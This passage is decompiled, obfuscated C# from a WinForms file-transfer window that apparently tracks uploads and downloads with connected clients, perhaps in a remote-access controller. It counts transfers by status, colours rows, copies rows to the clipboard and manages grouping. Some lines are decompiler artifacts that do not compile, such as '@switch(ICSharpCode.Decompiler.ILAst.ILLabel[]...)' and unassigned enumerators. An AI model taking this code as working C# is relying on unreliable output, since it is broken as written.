						}
						IL_280:
						goto IL_2D0;
						IL_282:
						text2 = "0 B";
						goto IL_280;
						IL_28B:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_2A1:;
					}
					catch when (endfilter(obj2 is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex = (Exception)obj3;
						goto IL_28B;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_2D0:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					ToolStripItem toolStripItem = toolStripStatusLabel2;
					string[] array4 = array3;
					array2[num5] = text3;
					array4[4] = ")";
					toolStripItem.Text = string.Concat(array4);
				}
				else
				{
					this.vmethod_54().Text = "Selected: 0";
				}
				long num8 = 0L;
				long num9 = 0L;
				long num10 = 0L;
				long num11 = 0L;
				double num12 = 0.0;
				FastObjectListView fastObjectListView = this.vmethod_20();
				try
				{
					foreach (object obj4 in fastObjectListView.Objects)
					{
						cTransfer cTransfer2 = (cTransfer)obj4;
						num12 += (double)cTransfer2.SIZE_BYTES;
						checked
						{
							if (Operators.CompareString(cTransfer2.STATUS, "Downloading", true) == 0 | Operators.CompareString(cTransfer2.STATUS, "Uploading", true) == 0)
							{
								num8 += 1L;
							}
							if (Operators.CompareString(cTransfer2.STATUS, "Completed", true) == 0)
							{
								num9 += 1L;
							}
							if (Operators.CompareString(Strings.Mid(cTransfer2.STATUS, 1, 7), "Ignored", true) == 0)
							{
								num9 += 1L;
							}
							if (Operators.CompareString(Strings.Mid(cTransfer2.STATUS, 1, 6), "Failed", true) == 0)
							{
								num10 += 1L;
							}
							if (Operators.CompareString(cTransfer2.STATUS, "Cancelled", true) == 0)
							{
								num11 += 1L;
							}
						}
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				this.vmethod_42().Text = "Transfers: " + Conversions.ToString(num8);
				ToolStripStatusLabel toolStripStatusLabel3 = this.vmethod_68();
				string text4 = "Size: ";
				double num13 = num12;
				flag = false;
				ptr = ref flag;
				num4 = num13;
				string str = text4;
				ToolStripStatusLabel toolStripStatusLabel4 = toolStripStatusLabel3;
				object obj5;
				try
				{
					ProjectData.ClearProjectError();
					num6 = 2;
					string text = string.Empty;
					if (num4 >= 1099511627776.0)
					{
						text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num4 >= 1073741824.0)
					{
						text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num4 >= 1048576.0)
					{
						text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num4 >= 1024.0)
					{
						text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
					}
					else if (num4 < 1024.0)
					{
						text = Conversions.ToString(Conversion.Fix(num4)) + " B";
					}
					if (ptr)
					{
						text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
					}
					if (text.Length > 0)
					{
						text2 = text;
					}
					else
					{
						text2 = " 0 B";
					}
					IL_611:
					goto IL_661;
					IL_613:
					text2 = "0 B";
					goto IL_611;
					IL_61C:
					num7 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
					IL_632:;
				}
				catch when (endfilter(obj5 is Exception & num6 != 0 & num7 == 0))
				{
					Exception ex2 = (Exception)obj6;
					goto IL_61C;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_661:
				if (num7 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string str2 = text2;
				toolStripStatusLabel4.Text = str + str2;
				this.vmethod_48().Text = "Completed: " + Conversions.ToString(num9);
				this.vmethod_52().Text = "Cancelled: " + Conversions.ToString(num11);
				this.vmethod_50().Text = "Failed: " + Conversions.ToString(num10);
			}
		}
		catch (Exception ex3)
		{
		}
	}

	// Token: 0x060017DB RID: 6107 RVA: 0x000B01C8 File Offset: 0x000AE3C8
	private void method_27(object sender, FormatRowEventArgs e)
	{
		try
		{
			cTransfer cTransfer = (cTransfer)e.Model;
			if (Operators.CompareString(cTransfer.STATUS, "Completed", true) == 0)
			{
				e.Item.BackColor = Color.LimeGreen;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (Operators.CompareString(cTransfer.STATUS, "Cancelled", true) == 0 | Operators.CompareString(Strings.Mid(cTransfer.STATUS, 1, 6), "Failed", true) == 0)
			{
				e.Item.BackColor = Color.Red;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (Operators.CompareString(Strings.Mid(cTransfer.STATUS, 1, 7), "Ignored", true) == 0)
			{
				e.Item.BackColor = Color.LightSkyBlue;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			if (cTransfer.bJustConnected)
			{
				e.Item.BackColor = Color.LightSkyBlue;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (!cTransfer.pending_dc & !cTransfer.pending_dc_timeout & cTransfer.TRANSFER_ACTIVE)
			{
				e.Item.BackColor = Color.White;
			}
			else if (cTransfer.pending_dc & cTransfer.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Yellow;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (cTransfer.pending_dc & !cTransfer.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Red;
				cTransfer.STATUS = "Failed (Client disconnected)";
				cTransfer.TRANSFER_ACTIVE = false;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060017DC RID: 6108 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_28(object sender, EventArgs e)
	{
	}

	// Token: 0x060017DD RID: 6109 RVA: 0x000B0420 File Offset: 0x000AE620
	private void method_29(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cTransfer cTransfer = (cTransfer)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cTransfer.USER,
						"\t",
						cTransfer.FILE,
						"\t",
						cTransfer.SIZE,
						"\t",
						cTransfer.PROGRESS,
						"\t",
						cTransfer.SPEED,
						"\t",
						cTransfer.STATUS,
						"\t",
						cTransfer.ELAPSED,
						"\t",
						cTransfer.ETA,
						"\t",
						cTransfer.DIRECTION,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x060017DE RID: 6110 RVA: 0x000B057C File Offset: 0x000AE77C
	private void method_30(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_20();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cTransfer cTransfer = (cTransfer)obj;
				stringBuilder.Append(string.Concat(new string[]
				{
					cTransfer.USER,
					"\t",
					cTransfer.FILE,
					"\t",
					cTransfer.SIZE,
					"\t",
					cTransfer.PROGRESS,
					"\t",
					cTransfer.SPEED,
					"\t",
					cTransfer.STATUS,
					"\t",
					cTransfer.ELAPSED,
					"\t",
					cTransfer.ETA,
					"\t",
					cTransfer.DIRECTION,
					"\r\n"
				}));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x060017DF RID: 6111 RVA: 0x0000C3A4 File Offset: 0x0000A5A4
	private void method_31(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_9();
			this.method_10();
			this.method_11();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x060017E0 RID: 6112 RVA: 0x000B06C4 File Offset: 0x000AE8C4
	private void method_32(object sender, CreateGroupsEventArgs e)
	{
		try
		{
			if (this.vmethod_20().Items.Count > 0 & Class135.smethod_0().GroupSubtitlesTransfers)
			{
				try
				{
					foreach (OLVGroup olvgroup in e.Groups)
					{
						if (Class130.concurrentDictionary_1.ContainsKey(olvgroup.Header))
						{
							olvgroup.Subtitle = Conversions.ToString(Operators.ConcatenateObject("Files: " + Conversions.ToString(olvgroup.VirtualItemCount) + "/", Interaction.IIf((double)olvgroup.VirtualItemCount > Conversion.Val(Class130.concurrentDictionary_1[olvgroup.Header]), olvgroup.VirtualItemCount, Class130.concurrentDictionary_1[olvgroup.Header])));
						}
						else
						{
							olvgroup.Subtitle = "Files: " + Conversions.ToString(olvgroup.VirtualItemCount);
						}
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060017E1 RID: 6113 RVA: 0x0000C3C3 File Offset: 0x0000A5C3
	private void method_33(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_76().Text, "Show", true) == 0)
		{
			Class135.smethod_0().ShowGroupsTransfers = true;
		}
		else
		{
			Class135.smethod_0().ShowGroupsTransfers = false;
		}
		this.method_3();
	}

	// Token: 0x060017E2 RID: 6114 RVA: 0x0000C3FB File Offset: 0x0000A5FB
	private void method_34(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_80().Text, "Show", true) == 0)
		{
			Class135.smethod_0().GroupSubtitlesTransfers = true;
		}
		else
		{
			Class135.smethod_0().GroupSubtitlesTransfers = false;
		}
		this.method_4();
	}

	// Token: 0x060017E3 RID: 6115 RVA: 0x000B07F0 File Offset: 0x000AE9F0
	private void method_35(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(this.vmethod_82().Text, "Collapse", true) == 0)
			{
				try
				{
					foreach (OLVGroup olvgroup in this.vmethod_20().OLVGroups)
					{
						olvgroup.Collapsed = true;
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				this.vmethod_82().Text = "Expand";
			}
			else
			{
				try
				{
					foreach (OLVGroup olvgroup2 in this.vmethod_20().OLVGroups)
					{
						olvgroup2.Collapsed = false;
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator2;
					if (enumerator2 != null)
					{
						enumerator2.Dispose();
					}
				}
				this.vmethod_82().Text = "Collapse";
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060017E4 RID: 6116 RVA: 0x000B08D8 File Offset: 0x000AEAD8
	private void method_36(object sender, EventArgs e)
	{
		Class135.smethod_0().GroupSortingTransfersDir = true;
		Class135.smethod_0().GroupSortingTransfersUser = false;
		this.vmethod_86().Checked = true;
		this.vmethod_90().Checked = false;
		this.vmethod_20().Sort(9);
		Class135.smethod_0().Save();
	}

	// Token: 0x060017E5 RID: 6117 RVA: 0x000B092C File Offset: 0x000AEB2C
	private void method_37(object sender, EventArgs e)
	{
		Class135.smethod_0().GroupSortingTransfersDir = false;
		Class135.smethod_0().GroupSortingTransfersUser = true;
		this.vmethod_86().Checked = false;
		this.vmethod_90().Checked = true;
		this.vmethod_20().Sort(0);
		Class135.smethod_0().Save();
	}

	// Token: 0x060017E6 RID: 6118 RVA: 0x0000C433 File Offset: 0x0000A633
	private void method_38(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_6();
			this.method_7();
			this.method_8();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x060017E7 RID: 6119 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_39(object sender, EventArgs e)
	{
	}

	// Token: 0x060017E8 RID: 6120 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_40(object sender, GroupExpandingCollapsingEventArgs e)
	{
	}

	// Token: 0x060017E9 RID: 6121 RVA: 0x0000C452 File Offset: 0x0000A652
	private void method_41(object sender, CreateGroupsEventArgs e)
	{
		e.Parameters.PrimarySortOrder = SortOrder.None;
	}

	// Token: 0x060017EA RID: 6122 RVA: 0x000B0980 File Offset: 0x000AEB80
	private void method_42(object sender, ColumnWidthChangingEventArgs e)
	{
		int index = 9;
		if (e.ColumnIndex == 9)
		{
			e.Cancel = true;
			e.NewWidth = this.vmethod_20().Columns[index].Width;
		}
	}

	// Token: 0x040008C8 RID: 2248
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x040008C9 RID: 2249
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x040008CA RID: 2250
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x040008CB RID: 2251
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x040008CC RID: 2252
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x040008CD RID: 2253
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x040008CE RID: 2254
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x040008CF RID: 2255
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x040008D0 RID: 2256
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x040008D1 RID: 2257
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x040008D2 RID: 2258
	private FastObjectListView fastObjectListView_0;

	// Token: 0x040008D3 RID: 2259
	private OLVColumn olvcolumn_0;

	// Token: 0x040008D4 RID: 2260
	private OLVColumn olvcolumn_1;

	// Token: 0x040008D5 RID: 2261
	private OLVColumn olvcolumn_2;

	// Token: 0x040008D6 RID: 2262
	private OLVColumn olvcolumn_3;

	// Token: 0x040008D7 RID: 2263
	private OLVColumn olvcolumn_4;

	// Token: 0x040008D8 RID: 2264
	private OLVColumn olvcolumn_5;

	// Token: 0x040008D9 RID: 2265
	private OLVColumn olvcolumn_6;

	// Token: 0x040008DA RID: 2266
	private OLVColumn olvcolumn_7;

	// Token: 0x040008DB RID: 2267
	private StatusStrip statusStrip_0;

	// Token: 0x040008DC RID: 2268
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x040008DD RID: 2269
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x040008DE RID: 2270
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040008DF RID: 2271
	private OLVColumn olvcolumn_8;

	// Token: 0x040008E0 RID: 2272
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x040008E1 RID: 2273
	private ToolStripStatusLabel toolStripStatusLabel_3;

	// Token: 0x040008E2 RID: 2274
	private ToolStripStatusLabel toolStripStatusLabel_4;

	// Token: 0x040008E3 RID: 2275
	private ToolStripStatusLabel toolStripStatusLabel_5;

	// Token: 0x040008E4 RID: 2276
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040008E5 RID: 2277
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x040008E6 RID: 2278
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x040008E7 RID: 2279
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x040008E8 RID: 2280
	private ToolStripMenuItem toolStripMenuItem_8;

	// Token: 0x040008E9 RID: 2281
	private ToolStripSeparator toolStripSeparator_4;

	// Token: 0x040008EA RID: 2282
	private ToolStripStatusLabel toolStripStatusLabel_6;

	// Token: 0x040008EB RID: 2283
	private OLVColumn olvcolumn_9;

	// Token: 0x040008EC RID: 2284
	private ToolStripMenuItem toolStripMenuItem_9;

	// Token: 0x040008ED RID: 2285
	private ToolStripMenuItem toolStripMenuItem_10;

	// Token: 0x040008EE RID: 2286
	private ToolStripMenuItem toolStripMenuItem_11;

	// Token: 0x040008EF RID: 2287
	private ToolStripMenuItem toolStripMenuItem_12;

	// Token: 0x040008F0 RID: 2288
	private ToolStripMenuItem toolStripMenuItem_13;

	// Token: 0x040008F1 RID: 2289
	private ToolStripMenuItem toolStripMenuItem_14;

	// Token: 0x040008F2 RID: 2290
	private ToolStripMenuItem toolStripMenuItem_15;

	// Token: 0x040008F3 RID: 2291
	private ToolStripMenuItem toolStripMenuItem_16;

	// Token: 0x040008F4 RID: 2292
	private ToolStripSeparator toolStripSeparator_5;

	// Token: 0x040008F5 RID: 2293
	private ToolStripMenuItem toolStripMenuItem_17;

	// Token: 0x040008F6 RID: 2294
	private ToolStripSeparator toolStripSeparator_6;

	// Token: 0x040008F7 RID: 2295
	private BarRenderer barRenderer_0;

	// Token: 0x040008F8 RID: 2296
	public Collection collection_0;

	// Token: 0x040008F9 RID: 2297
	public ConcurrentStack<cTransfer> concurrentStack_0;

	// Token: 0x040008FA RID: 2298
	public ConcurrentStack<cTransfer> concurrentStack_1;

	// Token: 0x040008FB RID: 2299
	public ConcurrentStack<cTransfer> concurrentStack_2;

	// Token: 0x040008FC RID: 2300
	private bool bool_0;

	// Token: 0x020001A7 RID: 423
	// (Invoke) Token: 0x060017EE RID: 6126
	private delegate void Delegate167();

	// Token: 0x020001A8 RID: 424
	// (Invoke) Token: 0x060017F2 RID: 6130
	private delegate void Delegate168();

	// Token: 0x020001A9 RID: 425
	// (Invoke) Token: 0x060017F6 RID: 6134
	private delegate void Delegate169();

	// Token: 0x020001AA RID: 426
	// (Invoke) Token: 0x060017FA RID: 6138
	private delegate void Delegate170(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5);

	// Token: 0x020001AB RID: 427
	// (Invoke) Token: 0x060017FE RID: 6142
	private delegate void Delegate171(string string_0);

	// Token: 0x020001AC RID: 428
	// (Invoke) Token: 0x06001802 RID: 6146
	private delegate void Delegate172();

	// Token: 0x020001AD RID: 429
	// (Invoke) Token: 0x06001806 RID: 6150
	private delegate void Delegate173(ref ListView listView_0, string string_0, int int_0);

	// Token: 0x020001AE RID: 430
	// (Invoke) Token: 0x0600180A RID: 6154
	private delegate void Delegate174(string string_0, string string_1, string string_2, string string_3, string string_4);

	// Token: 0x020001AF RID: 431
	// (Invoke) Token: 0x0600180E RID: 6158
	private delegate void Delegate175();

	// Token: 0x020001B0 RID: 432
	// (Invoke) Token: 0x06001812 RID: 6162
	private delegate void Delegate176(string string_0, int int_0, string string_1);

	// Token: 0x020001B1 RID: 433
	// (Invoke) Token: 0x06001816 RID: 6166
	private delegate void Delegate177();

	// Token: 0x020001B2 RID: 434
	// (Invoke) Token: 0x0600181A RID: 6170
	private delegate void Delegate178();

	// Token: 0x020001B3 RID: 435
	// (Invoke) Token: 0x0600181E RID: 6174
	private delegate void Delegate179(string string_0, int int_0);

	// Token: 0x020001B4 RID: 436
	// (Invoke) Token: 0x06001822 RID: 6178
	private delegate void Delegate180();

	// Token: 0x020001B5 RID: 437
	// (Invoke) Token: 0x06001826 RID: 6182
	private delegate void Delegate181();

	// Token: 0x020001B6 RID: 438
	// (Invoke) Token: 0x0600182A RID: 6186
	private delegate void Delegate182(string string_0, string string_1, string string_2, string string_3, long long_0, string string_4, string string_5, string string_6);
}
